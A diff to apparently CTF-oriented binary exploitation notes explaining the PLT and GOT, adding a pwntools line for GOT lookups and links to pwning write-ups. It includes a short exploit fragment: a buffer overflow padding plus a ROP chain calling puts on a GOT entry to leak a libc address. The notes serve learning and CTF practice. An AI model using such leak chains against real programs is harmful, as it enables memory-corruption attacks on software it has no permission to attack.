@@ -16,9 +16,11 @@ PLT - Procedure Linkage Table
 GOT - Global Offset Table
 
 - Contains pointers to external resources
-
-
-
+- Accessible in pwntools via
+```python
+  elf.got['function_name']
+  ```
+  
 Example pwntools script to find leak:
 
 ```python
@@ -35,7 +37,9 @@ rop = ROP(elf)
 rop.puts(elf.got['puts'])
 p.sendline('A'*24+str(rop))
 ```
+[More Detailed Look at PLT/GOT for Pwning Purposes](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)
 
+[Example Writeup Using Puts Puts with Pwntools](http://ctfhacker.com/ctf/pwnable/2015/08/18/campctf-bitterman.html)
 
 
 ### **Libc_csu_init**
